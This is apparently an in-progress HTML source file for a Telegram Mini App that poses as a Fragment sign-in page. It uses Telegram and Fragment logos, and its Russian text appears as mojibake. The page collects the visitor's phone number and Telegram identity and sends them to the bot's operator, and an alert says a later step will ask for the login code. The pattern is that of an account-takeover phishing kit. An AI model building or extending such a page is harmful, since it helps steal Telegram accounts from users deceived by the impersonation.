<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 15px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      background-color: #ffffff;
    }

    .container {
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 440px;
      padding: 25px;
      text-align: center;
      margin: 10px 0;
    }

    .debug-panel {
      position: fixed;
      top: 10px;
      right: 10px;
      background: rgba(0,0,0,0.9);
      color: white;
      padding: 15px;
      border-radius: 10px;
      z-index: 10000;
      font-size: 12px;
      max-width: 300px;
    }

    .debug-btn {
      background: #007bff;
      color: white;
      border: none;
      padding: 8px 12px;
      margin: 5px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 12px;
    }

    .debug-status {
      margin-top: 10px;
      background: rgba(255,255,255,0.1);
      padding: 8px;
      border-radius: 5px;
      font-family: monospace;
    }

    /* –û—Å—Ç–∞–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ –∏–∑ —Ç–≤–æ–µ–≥–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è */
    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 25px;
    }

    .icons img {
      width: 45px;
      height: 45px;
      border-radius: 12px;
    }

    h1 {
      font-size: 22px;
      font-weight: 800;
      margin-bottom: 12px;
      color: #000;
      line-height: 1.3;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 25px;
    }

    select, .phone-input {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 16px;
      font-size: 15px;
      background-color: #f8f9fa;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 12px;
    }

    .buttons button {
      flex: 1;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 14px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
      border: 1px solid #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }
  </style>
</head>
<body>
  <!-- Debug –ø–∞–Ω–µ–ª—å -->
  <div class="debug-panel">
    <h4>üêõ Debug Panel</h4>
    <button class="debug-btn" onclick="checkTelegram()">Check Telegram</button>
    <button class="debug-btn" onclick="sendTestData()">Send Test Data</button>
    <button class="debug-btn" onclick="showUserInfo()">User Info</button>
    <div class="debug-status" id="debug-status">Status: Loading...</div>
  </div>

  <!-- –¢–≤–æ—ë –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo">
    </div>
    <h1 style="margin-bottom: 8px;">–í–æ–π–¥–∏—Ç–µ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç Telegram</h1>
    <p style="font-size: 15px; color: #555; margin-bottom: 8px; line-height: 1.5;">
      –¥–ª—è <a href="https://fragment.com" style="color: #007bff; cursor: pointer; text-decoration: none;">fragment.com</a> –∏ <a href="https://t.me/fragment" style="color: #007bff; cursor: pointer; text-decoration: none;">Fragment Auction Alerts</a>.
    </p>
    <p style="font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5;">
      –í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π <strong>–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</strong> –≤ <span style="color: #007bff; cursor: pointer;">–º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ</span>.<br>
      –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram.
    </p>
    <div class="input-group">
      <select id="country" onchange="updateCountryCode()">
        <option value="+7">–†–æ—Å—Å–∏—è (+7)</option>
        <option value="+375">–ë–µ–ª–∞—Ä—É—Å—å (+375)</option>
        <option value="+380">–£–∫—Ä–∞–∏–Ω–∞ (+380)</option>
        <option value="+7">–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω (+7)</option>
      </select>
      <div class="phone-input" style="display: flex; background-color: #f8f9fa; border-radius: 16px; overflow: hidden; height: 48px;">
        <span class="country-code" id="countryCode" style="padding: 14px; background: #f8f9fa; border-right: 1.5px solid #e9ecef; min-width: 65px; color: #000; font-weight: 700; display: flex; align-items: center; justify-content: center; margin: 4px 0; border-radius: 16px 0 0 16px; font-size: 15px;">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞" style="flex: 1; border: none; padding: 14px; background: #f8f9fa; border-radius: 0 16px 16px 0; font-size: 15px; height: 100%;">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">–û–¢–ú–ï–ù–ê</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">–î–ê–õ–ï–ï</button>
    </div>
  </div>

  <script>
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
    const tg = window.Telegram.WebApp;
    const debugStatus = document.getElementById('debug-status');

    // –†–∞—Å—à–∏—Ä—è–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
    tg.expand();
    tg.MainButton.hide();

    debugStatus.textContent = 'Status: Telegram WebApp loaded';

    // Debug —Ñ—É–Ω–∫—Ü–∏–∏
    function checkTelegram() {
      const checks = [
        ['Telegram object', !!window.Telegram],
        ['WebApp object', !!window.Telegram.WebApp],
        ['sendData function', typeof tg.sendData === 'function'],
        ['initData', tg.initData ? 'Available' : 'Not available'],
        ['Platform', tg.platform],
        ['Version', tg.version],
        ['User ID', tg.initDataUnsafe?.user?.id || 'No user'],
        ['Username', tg.initDataUnsafe?.user?.username || 'No username']
      ];

      let result = 'üîç TELEGRAM STATUS:<br>';
      checks.forEach(([name, value]) => {
        result += `<b>${name}:</b> ${value}<br>`;
      });

      debugStatus.innerHTML = result;
      console.log('Telegram Check:', checks);
    }

    function sendTestData() {
      debugStatus.textContent = 'Status: Sending test data...';
      
      const testData = {
        type: 'log',
        action: 'DEBUG_TEST',
        details: '–¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–≤—è–∑–∏',
        user: tg.initDataUnsafe?.user || {
          id: 123456789,
          first_name: 'Test User',
          username: 'testuser'
        },
        timestamp: new Date().toLocaleString('ru-RU')
      };

      console.log('üì§ SENDING TEST DATA:', testData);

      try {
        if (typeof tg.sendData === 'function') {
          tg.sendData(JSON.stringify(testData));
          debugStatus.innerHTML = '‚úÖ <b>Status:</b> Data sent via sendData!<br>Check bot console for [WEB_APP_DEBUG] messages';
          console.log('‚úÖ Data sent via sendData');
        } else {
          debugStatus.innerHTML = '‚ùå <b>Status:</b> sendData not available!';
          console.error('‚ùå sendData not available');
        }
      } catch (error) {
        debugStatus.innerHTML = '‚ùå <b>Status:</b> Error sending data';
        console.error('‚ùå Send error:', error);
      }
    }

    function showUserInfo() {
      const user = tg.initDataUnsafe?.user;
      if (user) {
        debugStatus.innerHTML = `
          <b>üë§ USER INFO:</b><br>
          ID: ${user.id}<br>
          Name: ${user.first_name}<br>
          Username: @${user.username || 'none'}<br>
          Language: ${user.language_code || 'unknown'}
        `;
      } else {
        debugStatus.innerHTML = '‚ùå <b>User not available in initDataUnsafe</b>';
      }
    }

    // –§—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    function updateCountryCode() {
      const countrySelect = document.getElementById('country');
      const countryCodeElement = document.getElementById('countryCode');
      const selectedValue = countrySelect.value;
      countryCodeElement.textContent = selectedValue;
    }

    function handlePhoneSubmit() {
      const phone = document.getElementById('phone').value;
      const countryCode = document.getElementById('countryCode').textContent;
      
      if (!phone) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
        return;
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –æ –≤–≤–æ–¥–µ –Ω–æ–º–µ—Ä–∞
      sendLog('PHONE_ENTERED', `${countryCode}${phone}`);
      
      // –ó–¥–µ—Å—å –±—É–¥–µ—Ç –ø–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç–∫—Ä–∞–Ω—É
      alert('–ù–æ–º–µ—Ä –ø—Ä–∏–Ω—è—Ç! –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç –ø–µ—Ä–µ—Ö–æ–¥ –∫ –≤–≤–æ–¥—É –∫–æ–¥–∞');
    }

    function handleCancel() {
      sendLog('USER_CANCELLED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é');
      tg.close();
    }

    // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤
    function sendLog(action, details = '') {
      const user = tg.initDataUnsafe?.user;
      
      const logData = {
        type: 'log',
        action: action,
        details: details,
        user: user ? {
          id: user.id,
          first_name: user.first_name,
          username: user.username
        } : null,
        timestamp: new Date().toLocaleString('ru-RU')
      };
      
      console.log('üì§ [MINI_APP] –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞:', logData);
      
      try {
        if (typeof tg.sendData === 'function') {
          tg.sendData(JSON.stringify(logData));
          console.log('‚úÖ [MINI_APP] –õ–æ–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–µ—Ä–µ–∑ sendData');
        } else {
          console.error('‚ùå [MINI_APP] sendData –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
        }
      } catch (error) {
        console.error('‚ùå [MINI_APP] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞:', error);
      }
    }

    // –ê–≤—Ç–æ–ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
    setTimeout(() => {
      checkTelegram();
      sendLog('APP_STARTED', '–ú–∏–Ω–∏-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–ø—É—â–µ–Ω–æ');
    }, 1000);
  </script>
</body>
</html>